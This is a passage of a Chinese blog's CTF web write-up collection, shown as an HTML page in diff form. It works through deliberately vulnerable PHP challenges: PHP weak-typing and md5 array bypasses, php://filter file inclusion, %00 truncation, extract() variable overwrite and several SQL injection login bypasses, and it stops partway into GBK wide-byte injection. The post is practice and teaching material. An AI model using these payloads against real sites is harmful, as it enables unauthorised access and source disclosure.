@@ -1,4 +1,560 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 3.9.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png"><link rel="mask-icon" href="/images/logo.svg" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"blog.suqir.xyz",root:"/",scheme:"Gemini",version:"7.7.2",exturl:!1,sidebar:{position:"right",display:"hide",padding:18,offset:12,onmobile:!0},copycode:{enable:!1,show_result:!1,style:null},back2top:{enable:!0,sidebar:!1,scrollpercent:!1},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!1,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"button",active:"gitalk",storage:!0,lazyload:!1,nav:null,activeClass:"gitalk"},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!0,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新"><meta name="keywords" content="博客,苏乞儿,suqir"><meta property="og:type" content="article"><meta property="og:title" content="CTF"><meta property="og:url" content="https://blog.suqir.xyz/2018/10/12/CTF/index.html"><meta property="og:site_name" content="苏乞儿&#39;s Blog"><meta property="og:description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png"><meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/ccdj1.png"><meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/AAencode.png"><meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/wjbh.png"><meta property="og:image" content="https://blog.suqir.xyz/2018/10/12/CTF/hdhs.png"><meta property="og:updated_time" content="2020-03-18T10:46:48.668Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CTF"><meta name="twitter:description" content="本文总结了CTF中我所遇到的题型及其write up，本文长期更新"><meta name="twitter:image" content="https://blog.suqir.xyz/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png"><link rel="canonical" href="https://blog.suqir.xyz/2018/10/12/CTF/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>CTF | 苏乞儿's Blog</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript><link rel="alternate" href="/atom.xml" title="苏乞儿's Blog" type="application/atom+xml"></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">苏乞儿's Blog</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">人生一世，草木一秋</p></div><div class="site-nav-right"><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> 首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> 归档<span class="badge">12</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> 分类<span class="badge">5</span></a></li><li class="menu-item menu-item-网课宝"><a href="http://wk.suqir.xyz/" rel="noopener" target="_blank"><i class="fa fa-fw fa-calendar"></i> 网课宝</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i> 关于</a></li><li class="menu-item menu-item-search"><a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i> 搜索</a></li></ul></nav><div class="site-search"><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-icon"><i class="fa fa-search"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span></div><div id="search-result"><div id="no-result"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></div></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://blog.suqir.xyz/2018/10/12/CTF/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="http://q.qlogo.cn/headimg_dl?dst_uin=977265215&spec=100"><meta itemprop="name" content="苏乞儿"><meta itemprop="description" content="分享一切好玩的事情！"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="苏乞儿's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">CTF</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2018-10-12 17:52:11" itemprop="dateCreated datePublished" datetime="2018-10-12T17:52:11+08:00">2018-10-12</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span> <span class="post-meta-item-text">更新于</span> <time title="修改时间：2020-03-18 18:46:48" itemprop="dateModified" datetime="2020-03-18T18:46:48+08:00">2020-03-18</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a></span></span><span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span id="busuanzi_value_page_pv"></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span>7.3k</span></span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span>7 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>本文总结了CTF中我所遇到的题型及其write up，本文长期更新</p><a id="more"></a><p>希望各位多多评论指正，也算作对我第一次写技术文章的鼓励！</p><hr><p>训练场：<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">南京邮电大学CTF题库</a></p><hr><h1 id="直接查看源码"><a href="#直接查看源码" class="headerlink" title="直接查看源码"></a>直接查看源码</h1><p>出现场景：一般出现在第一题</p><p>write up： 直接Ctrl+u查看网页源码寻找flag</p><h1 id="修改maxlength"><a href="#修改maxlength" class="headerlink" title="修改maxlength"></a>修改maxlength</h1><p>出现场景：输入框输入内容有位数限制</p><p>write up：F12进入开发者模式修改maxlength后提交</p><h1 id="IP伪造"><a href="#IP伪造" class="headerlink" title="IP伪造"></a>IP伪造</h1><p>各种伪造IP的HTTP头：</p><table><thead><tr><th>序号</th><th>伪造方式</th></tr></thead><tbody><tr><td>1</td><td>X-Forwarded-For</td></tr><tr><td>2</td><td>Client-IP</td></tr><tr><td>3</td><td>x-remote-IP</td></tr><tr><td>4</td><td>x-originating-IP</td></tr><tr><td>5</td><td>x-remote-addr</td></tr></tbody></table><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">'1'</span>);</span><br><span class="line">       $nine = ord(<span class="string">'9'</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">          <span class="keyword">return</span> $number == <span class="string">'54975581388'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">'*******'</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">'key'</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">'access denied'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：要求传入key不包含数字[1-9]，但又等于54975581388，考虑转十六进制，发现<code>54975581388=0xccccccccc</code>,因此get方法传值<code>key=0xccccccccc</code></p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="类型一"><a href="#类型一" class="headerlink" title="类型一"></a>类型一</h2><p>介绍：PHP在处理哈希字符串时，会利用“!=”或“==”<br>来对哈希值进行比较，它把每一个以”0e”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0e”开头的，那么PHP将会认为他们相同，都是0</p><p>出现场景：PHP代码审计、含md5的题</p><p>write up：</p><p>修复方法：“===”和“!==”strict比较符，只有在类型相同时才相等。“==”和“!=”即non-strict比较符，会在类型转换后进行比较</p><p>扩展：0e开头MD5值小结</p><table><thead><tr><th>string</th><th>md5()</th></tr></thead><tbody><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr></tbody></table><h2 id="类型二"><a href="#类型二" class="headerlink" title="类型二"></a>类型二</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'a'</span>] != $_GET[<span class="string">'b'</span>])</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'a'</span>]) == md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'Wrong.'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：$_GET可以接受数组但MD5()函数若传递进去一个数组，则会返回null.因此向$_GET数组传入两个名为a、b的不相等的数组从而导致md5()均返回空:index.php?a[]=1&amp;b[]=2（即null=null）</p><h1 id="脑洞题"><a href="#脑洞题" class="headerlink" title="脑洞题"></a>脑洞题</h1><ol><li>源码找url</li></ol><p><img src="/2018/10/12/CTF/E:/Blog/source/_posts/CTF/ccdj.png" alt="image"></p><ol start="2"><li>源码看flag</li></ol><p><img src="/2018/10/12/CTF/ccdj1.png" alt="image"></p><h1 id="jjencode-aaencode（颜文字）"><a href="#jjencode-aaencode（颜文字）" class="headerlink" title="jjencode/aaencode（颜文字）"></a>jjencode/aaencode（颜文字）</h1><p>介绍：</p><blockquote><p>什么是jjencode?</p><p>将js代码转换成只有符号的字符串</p></blockquote><blockquote><p>什么是aaencode？</p><p>将js代码转换成常用的网络表情</p></blockquote><p>aaencode加密：<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p><p>解法：可以直接利用浏览器的控制台输入密文，执行后即可解密。</p><p><img src="/2018/10/12/CTF/AAencode.png" alt="image"></p><h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>典型的文件包含漏洞的格式网址：<code>php?file=xxx.php</code></p><p>原因：网页后端php（或其他）代码中使用了include等文件包含语句，而且所包含的文件由变量控制，恰恰此变量又能通过GET或POST等方式进行修改所造成的</p><p>利用方法：构建<code>file=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>注：其中index.php可以为任意已包含文件返回base64加密过的index.php文件源码。</p><p><img src="/2018/10/12/CTF/wjbh.png" alt="image"></p><p>注意：python3中base64的解密为base64.b64decode()</p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><ol><li>精度问题</li></ol><p><code>intval()</code>这个函数的作用是把参数自动转换成整数（int）</p><blockquote><p>$id = intval(1024.5)//结果为$id==1024</p></blockquote><h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>介绍：robots.txt是搜索引擎中访问网站的时候要查看的第一个文件，robots.txt文件告诉了蜘蛛程序在服务器上什么文件是可以被查的。</p><h1 id="00"><a href="#00" class="headerlink" title="%00"></a>%00</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">'nctf'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (@ereg (<span class="string">"^[1-9]+$"</span>, $_GET[<span class="string">'nctf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'必须输入数字才行'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (strpos ($_GET[<span class="string">'nctf'</span>], <span class="string">'#biubiubiu'</span>) !== <span class="keyword">FALSE</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'骚年，继续努力吧啊~'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>涉及漏洞：查到资料</p><blockquote><p>1.ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00</p></blockquote><blockquote><p>2.当ntf为数组时它的返回值不是FALSE</p></blockquote><p>利用方法：</p><blockquote><p>1.?nctf=1%00%23biubiubiu</p></blockquote><blockquote><p>2.?nctf[]=1</p></blockquote><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($_SERVER[<span class="string">"REQUEST_METHOD"</span>] == <span class="string">"POST"</span>) &#123; <span class="meta">?&gt;</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    extract($_POST);</span><br><span class="line">    <span class="keyword">if</span> ($pass == $thepassword_123) &#123; <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div class="alert alert-success"&gt;</span><br><span class="line">            &lt;code&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $theflag; <span class="meta">?&gt;</span>&lt;/code&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：<code>extract()</code>函数的作用：从数组中将变量导入到当前的符号表</p><blockquote><p>可以看到这里的代码为：extract($_POST)，即将POST的参数导入当前的符号表</p></blockquote><p>由于<code>extract()</code>函数存在变量覆盖漏洞，所以提交post参数：</p><p><code>pass=123&amp;thepassword_123=123//或者pass[]=&amp;thepassword_123</code></p><p>即:将两个变量的值修改成相同的，即可得到flag！</p><h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><p>源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">文件上传<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"upload.php"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"dir"</span> <span class="attr">value</span>=<span class="string">"/uploads/"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x00截断"><a href="#0x00截断" class="headerlink" title="0x00截断"></a>0x00截断</h2><p>绕过方法：在burpsuite—Hex中，将空格php后面一个字符的hex修改为00</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="常规注入"><a href="#常规注入" class="headerlink" title="常规注入"></a>常规注入</h2><h3 id="正常闭合"><a href="#正常闭合" class="headerlink" title="正常闭合"></a>正常闭合</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">"select user from ctf where (user='"</span>.$user.<span class="string">"') and (pw='"</span>.$pass.<span class="string">"')"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/br&gt;'</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">"admin"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;You are not admin!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br></pre></td></tr></table></figure><p>分析：会对传入参数两端去空格，然后sql拼接如下</p><p><code>$sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;;</code></p><p>所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。</p><p>MySQL主要有三种注释方式：</p><table><thead><tr><th>注释方式</th><th>说明</th></tr></thead><tbody><tr><td>#</td><td>注释到行尾</td></tr><tr><td>/*内容*/</td><td>用于行间或多行注释（也可用/**/代替空格）</td></tr><tr><td>–</td><td>也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1– ）</td></tr></tbody></table><p>解法：本题可post：<br><code>user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123</code></p><p>sql语句就变成<code>select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;)</code></p><p>查询语句就能成功返回user列，值为admin的那条记录。</p><h3 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">"select pw from ctf where user='$user'"</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;Log in failure!&lt;/p&gt;"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有<code>$query[pw]</code>的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。</p><p>例如：<code>select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;</code>这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。</p><p>注意别忘记输入pass后，会对其进行MD5加密。所以构造post：<code>user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir</code>查询语句就变为<code>SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;;</code></p><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造<code>username=suqir\&amp;password=or%201%23</code><br>使得查询语句如下</p><p><code>SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39;</code></p><p>即</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> </span><br><span class="line"><span class="keyword">name</span>=<span class="string">'suqir\' AND pass='</span>            『 [<span class="keyword">name</span>]的值为 [<span class="string">' AND pass=]  ，显然逻辑值为false 』</span></span><br><span class="line"><span class="string">or 1                                『 但没关系，[false or 1] 的逻辑值为真』 </span></span><br><span class="line"><span class="string">#'</span>                                  『 注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="literal">false</span> <span class="keyword">or</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>一道综合题:<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">南邮CTF-综合题2</a>及其<a href="https://a2chitect.cn/2018/02/02/%E5%8D%97%E9%82%AECTF%E5%B9%B3%E5%8F%B0-Web-%E7%BB%BC%E5%90%88%E9%A2%982-Writeup/" target="_blank" rel="noopener">writeup</a></p><h2 id="GBK宽字节编码漏洞-gbk-sql-injection"><a href="#GBK宽字节编码漏洞-gbk-sql-injection" class="headerlink" title="GBK宽字节编码漏洞(gbk_sql_injection)"></a>GBK宽字节编码漏洞(gbk_sql_injection)</h2><p>介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞<br>正常情况下 